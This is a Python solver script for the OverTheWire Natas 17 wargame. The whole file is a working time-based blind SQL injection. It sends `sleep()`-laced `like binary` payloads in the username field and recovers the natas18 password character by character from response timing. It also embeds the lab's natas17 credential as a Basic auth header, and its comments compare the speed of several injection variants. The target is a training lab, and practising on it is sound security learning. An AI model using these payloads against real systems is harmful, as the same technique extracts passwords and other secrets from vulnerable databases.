import requests, sys
#md5(substring)=md5(), sleep(1)                          - 5m  6s
#like binary, sleep(2)                                   - 2m 41s
#alphavite search, like binary, sleep(2)                 - 2m 46s
#alphavite search, like binary, sleep(1)                 - 1m 49s
#alphavite search, like binary without break, sleep(1)   - 1m 50s
#alphavite search, like binary without break, sleep(0.5) - 1m 25s
alph = ""
res = ""
for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    #binary like
    r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}, data = {"username": "natas18\" and password like binary \"%{}%\" and sleep(0.2) -- ".format(c)})
    if r.elapsed.microseconds >= 200000:
        alph += c
        print(alph)
        sys.stdout.flush()
for _ in range(100):
    found = False
    #all chars
    #for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    for c in alph:
        #md5(substring)=md5()
        #r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}, data = {"username": "natas18\" and md5(substring(password, 1, {})) = md5(\"{}\") and sleep(1) -- ".format(len(res) + 1, res + c)})
        #binary like
        r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}, data = {"username": "natas18\" and password like binary \"{}%\" and sleep(0.2) -- ".format(res + c)})
        if r.elapsed.microseconds >= 200000:
            res += c
            print(res)
            sys.stdout.flush()
            found = True
            #without break
            #break
    if not found:
        break
print("Not found next char")